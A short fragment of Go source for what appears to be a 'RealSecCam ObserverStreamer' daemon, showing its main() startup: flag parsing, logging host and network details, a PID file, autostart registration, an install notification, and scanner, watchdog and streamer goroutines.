					ticker.Stop()
					cmd.Process.Kill()
					return
				}
			}
	}
}

func main() {
	flag.BoolVar(&debugMode, "debug", false, "Enable verbose output")
	flag.BoolVar(&onceMode, "once", false, "Run a single scan then exit")
	flag.Parse()
	killStaleObservers()
	time.Sleep(500 * time.Millisecond)
	initCache()
	h, _ := os.Hostname()
	logf("RealSecCam ObserverStreamer v%s  host=%s  ip=%s  ssid=%s", Version, h, getLocalIP(), getSSID())
	writePID()
	defer removePID()
	registerAutostart()
	startKillServer()
	showInstallNotification()
	if onceMode { performScan(); return }
	go runScanner()
	go runWatchdog()
	go runStreamer()
	<-shutdownCh
	logf("ObserverStreamer shutting down.")
}
